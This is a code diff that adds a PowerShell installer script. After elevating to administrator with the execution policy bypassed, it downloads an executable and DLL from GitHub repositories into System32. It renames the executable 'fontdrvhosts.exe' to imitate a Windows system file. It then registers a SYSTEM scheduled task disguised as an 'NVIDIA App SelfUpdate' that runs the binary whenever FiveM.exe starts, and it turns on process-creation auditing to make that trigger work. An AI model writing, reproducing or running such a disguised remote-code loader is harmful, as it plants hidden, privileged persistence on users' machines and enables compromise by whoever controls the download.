@@ -1,0 +1,110 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host "Select Mode:"
+Write-Host "1. Install"
+Write-Host "2. Clean"
+
+$choice = Read-Host "Enter choice (1/2)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "Restarting with Administrator privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
+$dllDestination = Join-Path $system32Path "Guna.UI2.dll"
+$exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/webKUYTAIMAKTAK/raw/refs/heads/main/seanual.exe"
+$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
+$taskName = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
+
+# -----------------------------
+# Install Mode
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "`nStarting installation..."
+
+    # Download DLL first
+    Write-Host "Downloading Guna.UI2.dll..."
+    try {
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination
+        Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
+    } catch {
+        Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
+        exit
+    }
+
+    # Download exe and rename to fontdrvhosts.exe
+    Write-Host "Downloading and renaming executable to fontdrvhosts.exe..."
+    try {
+        $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
+        Move-Item -Path $tempFile -Destination $exeDestination -Force
+        Write-Host "fontdrvhosts.exe download completed." -ForegroundColor Green
+    } catch {
+        Write-Host "fontdrvhosts.exe download failed: $_" -ForegroundColor Red
+        exit
+    }
+
+    # Create scheduled task
+    Write-Host "Creating scheduled task..."
+    try {
+        $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
+        Invoke-Expression $cmd
+        Write-Host "Scheduled task created." -ForegroundColor Green
+    } catch {
+        Write-Host "Task creation failed: $_" -ForegroundColor Red
+    }
+
+    # Enable audit logging
+    Write-Host "Enabling audit logging..."
+    try {
+        auditpol /set /subcategory:"Process Creation" /success:enable
+        Write-Host "Audit logging enabled." -ForegroundColor Green
+    } catch {
+        Write-Host "Audit logging setup failed: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+}
+
+# -----------------------------
+# Clean Mode
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "Cleaning up installation..."
+
+    # Remove scheduled task
+    Write-Host "Removing scheduled task..."
+    try {
+        schtasks /delete /tn $taskName /f
+        Write-Host "Scheduled task removed." -ForegroundColor Green
+    } catch {
+        Write-Host "Task removal failed: $_" -ForegroundColor Yellow
+    }
+
+    # Remove files if they exist
+    if (Test-Path $exeDestination) { 
+        Remove-Item $exeDestination -Force 
+        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
+    }
+    
+    if (Test-Path $dllDestination) { 
+        Remove-Item $dllDestination -Force 
+        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
+    }
+
+    Write-Host "Cleanup completed." -ForegroundColor Green
+}
+
+else {
+    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+}
